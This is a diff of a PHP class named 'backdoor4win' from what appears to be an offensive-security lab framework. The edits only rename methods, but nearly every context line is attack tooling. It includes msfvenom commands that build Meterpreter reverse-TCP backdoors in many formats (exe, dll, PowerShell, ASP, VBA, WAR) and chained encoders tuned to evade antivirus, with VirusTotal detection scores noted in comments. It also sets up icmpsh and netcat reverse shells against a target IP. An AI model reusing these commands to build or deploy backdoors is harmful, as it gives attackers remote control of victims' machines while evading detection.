@@ -30,7 +30,7 @@ class backdoor4win extends malware4win{
         $victime->vm2upload("$this->dir_tools/Malware/icmp/icmpsh.exe","$this->vm_tmp_win/icmpsh.exe");
         $this->cmd($this->target_ip, "$this->vm_tmp_win/icmpsh.exe -t $this->attacker_ip -d 500 -b 30 -s 128" );
         $this->pause();
-        $this->file_file2virus2vt();
+        $this->file2virus2vt();
         $this->win2info();
         $this->pause();
         $this->cmd($this->attacker_ip,"python $this->dir_tmp/icmpsh_m.py $this->attacker_ip $this->target_ip");
@@ -71,8 +71,8 @@ class backdoor4win extends malware4win{
         $vmx->vm2download("$this->vm_tmp_win\\$file_jar_name", "$this->file_dir/$file_jar_name");
         $this->requette("/usr/bin/i686-w64-mingw32-strip $this->file_dir/$file_jar_name" );
         $check = new bin4win("$this->file_dir/$file_jar_name");	
-        $check->file_file2virus2vt();
-        //$check->file_file2sandbox("cuckoo1");
+        $check->file2virus2vt();
+        //$check->file2sandbox("cuckoo1");
         $check->win2info();
         $this->pause();
 
@@ -94,8 +94,8 @@ class backdoor4win extends malware4win{
         $vmx->vm2download("$this->vm_tmp_win\\$file_source_name", "$this->file_dir/$file_source_name");
         $this->requette("/usr/bin/i686-w64-mingw32-strip $this->file_dir/$file_source_name" );
         $check = new bin4win("$this->file_dir/$file_source_name");
-        $check->file_file2virus2vt();
-        //$check->file_file2sandbox("cuckoo1");
+        $check->file2virus2vt();
+        //$check->file2sandbox("cuckoo1");
         $check->win2info();
         $this->pause();
         return $this;
@@ -119,8 +119,8 @@ class backdoor4win extends malware4win{
         $vmx->vm2download("$this->vm_tmp_win\\$php_file_name", "$this->file_dir/$php_file_name");
         $this->requette("/usr/bin/i686-w64-mingw32-strip $this->file_dir/$php_file_name" );
         $check = new bin4win("$this->file_dir/$php_file_name");
-        $check->file_file2virus2vt();
-        //$check->file_file2sandbox("cuckoo1");
+        $check->file2virus2vt();
+        //$check->file2sandbox("cuckoo1");
         $check->win2info();
         $this->pause();
         return $this;
@@ -149,8 +149,8 @@ executables = [Executable(\"$this->vm_tmp_win\\\\$this->file_name.cxfreeze.py\")
         $vmx->vm2download("$this->vm_tmp_win\\$this->file_name.exe", "$this->file_dir/$this->file_name.exe");
         $this->requette("/usr/bin/i686-w64-mingw32-strip $this->file_dir/$this->file_name.exe" );
         $check = new bin4win("$this->file_dir/$this->file_name.exe");
-        $check->file_file2virus2vt();
-        //$check->file_file2sandbox("cuckoo1");
+        $check->file2virus2vt();
+        //$check->file2sandbox("cuckoo1");
         $check->win2info();
         $this->pause();
         return $this;
@@ -170,7 +170,7 @@ executables = [Executable(\"$this->vm_tmp_win\\\\$this->file_name.cxfreeze.py\")
         $vmx = new VM($this->target_vmx_name); // xp3
         $vmx->vm2download("$this->vm_tmp_win\\$file_source_name", "$this->file_dir\\$file_source_name");
         $check = new bin4win("$this->file_dir/$file_source_name");
-        $check->file_file2virus2vt();//$check->file_file2sandbox("cuckoo1");
+        $check->file2virus2vt();//$check->file2sandbox("cuckoo1");
         $check->win2info();
         $this->pause();
         return $this;
@@ -196,7 +196,7 @@ executables = [Executable(\"$this->vm_tmp_win\\\\$this->file_name.cxfreeze.py\")
         $vmx->vm2download("$this->vm_tmp_win\\$file_source_name", "$this->file_dir\\$file_source_name");
         $this->requette("/usr/bin/i686-w64-mingw32-strip $this->file_dir/$file_source_name" );
         $check = new bin4win("$this->file_dir/$file_source_name");
-        $check->file_file2virus2vt();//$check->file_file2sandbox("cuckoo1");
+        $check->file2virus2vt();//$check->file2sandbox("cuckoo1");
         $check->win2info();
         $this->pause();
         return $this;
@@ -217,7 +217,7 @@ executables = [Executable(\"$this->vm_tmp_win\\\\$this->file_name.cxfreeze.py\")
         $vmx->vm2download("$this->vm_tmp_win\\$file_source_name", "$this->file_dir/$file_source_name");
         $this->requette("/usr/bin/i686-w64-mingw32-strip $this->file_dir/$file_source_name" );
         $check = new bin4win("$this->file_dir/$file_source_name");
-        $check->file_file2virus2vt();//$check->file_file2sandbox("cuckoo1");
+        $check->file2virus2vt();//$check->file2sandbox("cuckoo1");
         $check->win2info();
         $this->pause();
         return $this;
@@ -238,7 +238,7 @@ executables = [Executable(\"$this->vm_tmp_win\\\\$this->file_name.cxfreeze.py\")
         $vmx->vm2download("$this->vm_tmp_win\\$file_source_name", "$this->file_dir\\$file_source_name");
         $this->requette("/usr/bin/i686-w64-mingw32-strip $this->file_dir/$file_source_name" );
         $check = new bin4win("$this->file_dir/$file_source_name");
-        $check->file_file2virus2vt();//$check->file_file2sandbox("cuckoo1");
+        $check->file2virus2vt();//$check->file2sandbox("cuckoo1");
         $check->win2info();
         $this->pause();
         return $this;
@@ -275,10 +275,10 @@ executables = [Executable(\"$this->vm_tmp_win\\\\$this->file_name.cxfreeze.py\")
         $this->cmd($this->attacker_ip,"nc $this->target_ip $this->attacker_port -v" );
         $this->pause();
         $vmx->vm2download("$this->vm_tmp_win\\$this->file_ext", "$this->file_path");
-        $this->file_file2virus2vt(); // 16/54
+        $this->file2virus2vt(); // 16/54
         $this->win2info();
         $this->pause();
-        //$this->file_file2sandbox("cuckoo1");
+        //$this->file2sandbox("cuckoo1");
         $this->note("Pour Options pour le backdoor = + de detection pour les antivirus");
         return $this;
     }
@@ -308,7 +308,7 @@ executables = [Executable(\"$this->vm_tmp_win\\\\$this->file_name.cxfreeze.py\")
             return $this->backdoor_win_msf2c2rev();
         }
         $vmx = new VM($this->target_vmx_name); // xp3
-        $file_h = new file("$this->file_dir/$this->file_name.h") ;
+        $file_h = new FILE($this->stream,"$this->file_dir/$this->file_name.h") ;
         $file_hex = $file_h->file_h2hex();
         $file_c = $file_hex->file_shellcode2c();
         //$file_c_pe = $file_c->file_c2pe();
@@ -318,8 +318,8 @@ executables = [Executable(\"$this->vm_tmp_win\\\\$this->file_name.cxfreeze.py\")
         $this->pause();
         $vmx->vm2download("$this->vm_tmp_win\\$file_c->file_name.exe", $this->file_path);
         $this->requette("/usr/bin/i686-w64-mingw32-strip $this->file_path");
-        $this->file_file2virus2vt(); // 7/56
-        //$this->file_file2sandbox("cuckoo1");
+        $this->file2virus2vt(); // 7/56
+        //$this->file2sandbox("cuckoo1");
         $this->win2info();
         
         $this->cmd("localhost","nc -l -p $this->attacker_port -v -n ");
@@ -345,7 +345,7 @@ p=subprocess.call(["cmd","-i"]);
 CODE;
         
         $this->requette("echo '$code' > $this->file_path" );
-        $this->file_file2virus2vt(); // 0 / 57
+        $this->file2virus2vt(); // 0 / 57
         return $this;
     }
     
@@ -373,11 +373,11 @@ CODE;
         $this->pause();
         $vmx->vm2download("$this->vm_tmp_win\\$this->file_name.1.exe", "$this->file_dir/$this->file_name.1.exe");
         $check = new bin4win("$this->file_dir/$this->file_name.1.exe");
-        $check->file_file2virus2vt(); // 17 / 67
+        $check->file2virus2vt(); // 17 / 67
         $check->win2info();
         $this->pause();
         
-        //$check->file_file2sandbox("cuckoo1");
+        //$check->file2sandbox("cuckoo1");
         $this->pause();
         
         
@@ -435,8 +435,8 @@ CODE;
         $this->pause();
         $vmx->vm2download("$this->vm_tmp_win\\$this->file_name.3.exe", "$this->file_dir/$this->file_name.3.exe");
         $check = new bin4win("$this->file_dir/$this->file_name.3.exe");
-        $check->file_file2virus2vt(); // 03 / 67
-        //$check->file_file2sandbox("cuckoo1");
+        $check->file2virus2vt(); // 03 / 67
+        //$check->file2sandbox("cuckoo1");
         $check->win2info();
         $this->pause();
         
@@ -459,8 +459,8 @@ CODE;
         if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("sudo chown $this->user2local:$this->user2local $this->file_path " );}
         else $this->cmd($this->attacker_ip,$query);
         $this->requette("/usr/bin/i686-w64-mingw32-strip $this->file_path" );
-        $this->file_file2virus2vt(); // 44 / 57
-        //$this->file_file2sandbox("cuckoo1");
+        $this->file2virus2vt(); // 44 / 57
+        //$this->file2sandbox("cuckoo1");
         $this->win2info();
         $this->pause();
         $vmx = new VM($this->target_vmx_name); // xp3
@@ -485,7 +485,7 @@ CODE;
         $vmx->vm2download("$this->vm_tmp_win\\$file_source_name", "$this->file_dir/$file_source_name");
         $this->requette("/usr/bin/i686-w64-mingw32-strip $this->file_dir/$file_source_name" );
         $check = new bin4win("$this->file_dir/$file_source_name");
-        $check->file_file2virus2vt();//$this->file_file2sandbox("cuckoo1");
+        $check->file2virus2vt();//$this->file2sandbox("cuckoo1");
         $check->win2info();
         $this->pause();
         return $this;
@@ -498,7 +498,7 @@ CODE;
         $query = "msfvenom --payload windows/meterpreter/reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port --arch x86 --platform windows --encoder x86/shikata_ga_nai --iterations 10 --format psh -o $this->file_path";
         if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("sudo chown $this->user2local:$this->user2local $this->file_path " );}
         else $this->cmd($this->attacker_ip,$query);
-        $this->file_file2virus2vt(); // 44 / 57
+        $this->file2virus2vt(); // 44 / 57
         $this->win2info();
         $this->pause();
         $this->cmd($this->attacker_ip, "powershell $this->vm_tmp_win\\$this->file_ext " );
@@ -513,8 +513,8 @@ CODE;
         $query = "msfvenom --payload windows/meterpreter/reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port --arch x86 --platform windows --encoder x86/shikata_ga_nai --iterations 10 --format dll -o $this->file_path";
         if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("sudo chown $this->user2local:$this->user2local $this->file_path " );}
         else $this->cmd($this->attacker_ip,$query);
-        $this->file_file2virus2vt(); // 44 / 57
-        //$this->file_file2sandbox("cuckoo1");
+        $this->file2virus2vt(); // 44 / 57
+        //$this->file2sandbox("cuckoo1");
         $this->win2info();
         $this->pause();
         $this->cmd($this->attacker_ip, "rundll32 $this->vm_tmp_win\\$this->file_ext start" );
@@ -530,8 +530,8 @@ CODE;
         if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("sudo chown $this->user2local:$this->user2local $this->file_path " );}
         else $this->cmd($this->attacker_ip,$query);
        // $this->requette("/usr/bin/i686-w64-mingw32-strip $this->file_path" );
-        $this->file_file2virus2vt(); // 44 / 57
-        //$this->file_file2sandbox("cuckoo1");
+        $this->file2virus2vt(); // 44 / 57
+        //$this->file2sandbox("cuckoo1");
         $this->win2info();
         $this->pause();
         $vmx = new VM($this->target_vmx_name); // xp3
@@ -547,8 +547,8 @@ CODE;
         $query = "msfvenom --payload windows/meterpreter/reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port --arch x86 --platform windows --encoder x86/shikata_ga_nai --iterations 10 --format raw -o $file_output1";
         if (! file_exists($file_output1)) {$this->requette($query);}
         else $this->cmd($this->attacker_ip,$query);
-        $display = new file($file_output1);
-        $display->file_file2info();
+        $display = new FILE($this->stream,$file_output1);
+        $display->file2info();
        
        $display->dot2png($display->file_raw2graph());
        
@@ -559,8 +559,8 @@ CODE;
         }
         else $this->cmd($this->attacker_ip,$query);
         $this->requette("/usr/bin/i686-w64-mingw32-strip $this->file_path" );
-        $this->file_file2virus2vt(); // 44 / 57
-        //$this->file_file2sandbox("cuckoo1");
+        $this->file2virus2vt(); // 44 / 57
+        //$this->file2sandbox("cuckoo1");
         $this->win2info();
         $this->pause();
         $vmx = new VM($this->target_vmx_name); // xp3
@@ -575,13 +575,13 @@ CODE;
         $query = "msfvenom --payload windows/meterpreter/reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port --arch x86 --platform windows --encoder x86/shikata_ga_nai --iterations 10 --format raw | msfvenom -a x86 -e x86/jmp_call_additive --iterations 3  --platform windows --format raw | msfvenom -a x86 -e x86/countdown --iterations 5  --platform windows --format raw | msfvenom  -a x86 -e x86/shikata_ga_nai --iterations 10  --platform windows --format raw | msfvenom -a x86 -e x86/call4_dword_xor --iterations 2  --platform windows --format raw | msfvenom -a x86 -e x86/alpha_mixed BufferRegister=EAX  --platform windows --format raw |  msfvenom -a x86 -e x86/jmp_call_additive --iterations 3  --platform windows --format raw | msfvenom -a x86 -e x86/countdown --iterations 5  --platform windows --format raw | msfvenom -a x86 -e x86/call4_dword_xor --iterations 2  --platform windows --format raw | msfvenom -a x86 -e x86/shikata_ga_nai --iterations 10  --platform windows --format raw -o $file_output1";
         if (! file_exists($file_output1)) {$this->requette($query);}
         else $this->cmd($this->attacker_ip,$query);
-        $display = new file($file_output1);$display->file_file2info();$display->file_raw2graph();
+        $display = new FILE($this->stream,$file_output1);$display->file2info();$display->file_raw2graph();
         $query = "msfvenom --payload windows/meterpreter/reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port --arch x86 --platform windows --encoder x86/shikata_ga_nai --iterations 10 --format raw | msfvenom -a x86 -e x86/jmp_call_additive --iterations 3  --platform windows --format raw | msfvenom -a x86 -e x86/countdown --iterations 5  --platform windows --format raw | msfvenom  -a x86 -e x86/shikata_ga_nai --iterations 10  --platform windows --format raw | msfvenom -a x86 -e x86/call4_dword_xor --iterations 2  --platform windows --format raw | msfvenom -a x86 -e x86/alpha_mixed BufferRegister=EAX  --platform windows --format raw |  msfvenom -a x86 -e x86/jmp_call_additive --iterations 3  --platform windows --format raw | msfvenom -a x86 -e x86/countdown --iterations 5  --platform windows --format raw | msfvenom -a x86 -e x86/call4_dword_xor --iterations 2  --platform windows --format raw | msfvenom -a x86 -e x86/shikata_ga_nai --iterations 10  --platform windows --format exe -o $this->file_path";
         if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("sudo chown $this->user2local:$this->user2local $this->file_path " );}
         else $this->cmd($this->attacker_ip,$query);
         $this->requette("/usr/bin/i686-w64-mingw32-strip $this->file_path" );
-        $this->file_file2virus2vt(); // 44 / 57
-        //$this->file_file2sandbox("cuckoo1");
+        $this->file2virus2vt(); // 44 / 57
+        //$this->file2sandbox("cuckoo1");
         $this->win2info();
         $this->pause();
         $vmx = new VM($this->target_vmx_name); // xp3
@@ -595,7 +595,7 @@ CODE;
         $query = "msfvenom --payload  php/reverse_perl LHOST='$this->attacker_ip' LPORT=$this->attacker_port R | tee $this->file_path";
         if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("sudo chown $this->user2local:$this->user2local $this->file_path " );}
         else $this->cmd($this->attacker_ip,$query);
-        $this->file_file2virus2vt();
+        $this->file2virus2vt();
         $this->win2info();
         $this->pause();
         $vmx = new VM($this->target_vmx_name); // xp3
@@ -610,7 +610,7 @@ CODE;
         $query = "msfvenom --payload ruby/shell_reverse_tcp LHOST='$this->attacker_ip' LPORT=$this->attacker_port --platform ruby --format raw | tee $this->file_path" ;
         if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("sudo chown $this->user2local:$this->user2local $this->file_path " );}
         else $this->cmd($this->attacker_ip,$query);
-        $this->file_file2virus2vt(); // 0 / 57
+        $this->file2virus2vt(); // 0 / 57
         $this->win2info();
         $this->pause();
         $vmx = new VM($this->target_vmx_name); // xp3
@@ -714,7 +714,7 @@ CODE;
     function backdoor_win_msf2c_win_shell_cmd($cmd, $badchars) {
         $this->ssTitre( "SHELLCODE C");
         
-        $file_output = new FILE("shell_cmd.h");
+        $file_output = new FILE($this->stream,"shell_cmd.h");
         // if(!file_exists("$this->dir_tmp/$file_output")) // --encoder x86/shikata_ga_nai --iterations 1
         $this->requette( "msfvenom --payload windows/exec cmd=\"$cmd\" -b \"\\x00$badchars\"  --arch x86 --platform windows  --format c > $file_output->file_path ");
         $check = file_get_contents("$file_output->file_path");
@@ -738,7 +738,7 @@ CODE;
         $query = "msfvenom --payload windows/meterpreter/reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port   --arch x86 --platform windows --encoder x86/shikata_ga_nai --iterations 1 --format asp -o $this->file_path";
         if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("sudo chown $this->user2local:$this->user2local $this->file_path " );}
         else $this->cmd($this->attacker_ip,$query);
-        $this->file_file2virus2vt(); // 44 / 57
+        $this->file2virus2vt(); // 44 / 57
         $this->win2info();
         $this->pause();
         $vmx = new VM($this->target_vmx_name); // xp3
@@ -752,7 +752,7 @@ CODE;
         $query = "msfvenom --payload windows/meterpreter/reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port  --arch x86 --platform windows --encoder x86/shikata_ga_nai --iterations 1 --format aspx -o $this->file_path";
         if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("sudo chown $this->user2local:$this->user2local $this->file_path " );}
         else $this->cmd($this->attacker_ip,$query);
-        $this->file_file2virus2vt(); // 44 / 57
+        $this->file2virus2vt(); // 44 / 57
         $this->win2info();
         $this->pause();
         $vmx = new VM($this->target_vmx_name); // xp3
@@ -766,7 +766,7 @@ CODE;
         $query = "msfvenom --payload windows/meterpreter/reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port  --arch x86 --platform windows --encoder x86/shikata_ga_nai --iterations 1 --format vba -o $this->file_path";
         if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("sudo chown $this->user2local:$this->user2local $this->file_path " );}
         else $this->cmd($this->attacker_ip,$query);
-        $this->file_file2virus2vt(); // 44 / 57
+        $this->file2virus2vt(); // 44 / 57
         $this->win2info();
         $this->pause();
         $vmx = new VM($this->target_vmx_name); // xp3
@@ -780,7 +780,7 @@ CODE;
         $query = "msfvenom --payload windows/meterpreter/reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port  --arch x86 --platform windows --encoder x86/shikata_ga_nai --iterations 1 --format vbs -o $this->file_path";
         if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("sudo chown $this->user2local:$this->user2local $this->file_path " );}
         else $this->cmd($this->attacker_ip,$query);
-        $this->file_file2virus2vt(); // 44 / 57
+        $this->file2virus2vt(); // 44 / 57
         $this->win2info();
         $this->pause();
         $vmx = new VM($this->target_vmx_name); // xp3
@@ -794,7 +794,7 @@ CODE;
         $query = "msfvenom --payload java/jsp_shell_reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port  --arch x86 --platform windows --encoder x86/shikata_ga_nai --iterations 1 --format war -o $this->file_path";
         if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("sudo chown $this->user2local:$this->user2local $this->file_path " );}
         else $this->cmd($this->attacker_ip,$query);
-        $this->file_file2virus2vt(); // 44 / 57
+        $this->file2virus2vt(); // 44 / 57
         $this->win2info();
         $this->pause();
         $vmx = new VM($this->target_vmx_name); // xp3
@@ -817,7 +817,7 @@ CODE;
         if (!file_exists($this->file_path ))  return $this->backdoor_win_bat();
         
         $this->requette("sudo chown $this->user2local:$this->user2local $this->file_path " );
-        $this->file_file2virus2vt();
+        $this->file2virus2vt();
         $this->win2info();
         $this->pause();
         $vmx = new VM($this->target_vmx_name); // xp3
@@ -831,7 +831,7 @@ CODE;
         $query = "msfvenom --payload java/jsp_shell_reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port  --arch x86 --platform windows --encoder x86/shikata_ga_nai --iterations 1 --format raw -o $this->file_path";
         if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("sudo chown $this->user2local:$this->user2local $this->file_path " );}
         else $this->cmd($this->attacker_ip,$query);
-        $this->file_file2virus2vt(); // 44 / 57
+        $this->file2virus2vt(); // 44 / 57
         $this->win2info();
         $this->pause();
         $vmx = new VM($this->target_vmx_name); // xp3
